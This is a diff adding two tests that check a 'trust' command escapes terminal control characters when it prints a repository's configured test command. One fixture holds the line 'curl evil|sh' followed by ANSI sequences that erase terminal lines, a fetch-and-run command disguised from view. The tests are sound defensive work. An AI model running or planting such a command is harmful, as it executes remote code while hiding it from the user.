@@ -48,6 +48,32 @@ describe("hench trust accept", () => {
     expect(text).toContain("verify_criteria");
   });
 
+  it("escapes terminal control characters in the test command it names, and in status", async () => {
+    mkdirSync(join(repo, ".rex"), { recursive: true });
+    const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
+    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: command }));
+
+    await cmdTrust(repo, ["status"], {});
+    await cmdTrust(repo, ["accept"], {});
+
+    const text = output.join("\n");
+    expect(text).not.toMatch(/[\u001b\r]/);
+    expect(text).toContain("curl evil|sh\\x1b[2K\\x0d\\x1b[1A\\x1b[2K");
+  });
+
+  it("escapes control characters in the accept line for a plain (baseline) test command", async () => {
+    // No chaining or fetching, so the checkout stays baseline and accept
+    // takes the branch that names the command.
+    mkdirSync(join(repo, ".rex"), { recursive: true });
+    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: "node -e 1\u001b[2K\rnode -e 2" }));
+
+    await cmdTrust(repo, ["accept"], {});
+
+    const text = output.join("\n");
+    expect(text).toContain("Trusted this repository's test command: node -e 1\\x1b[2K\\x0dnode -e 2");
+    expect(text).not.toMatch(/[\u001b\r]/);
+  });
+
   it("keeps the existing message when there is no test command", async () => {
     await cmdTrust(repo, ["accept"], {});
 
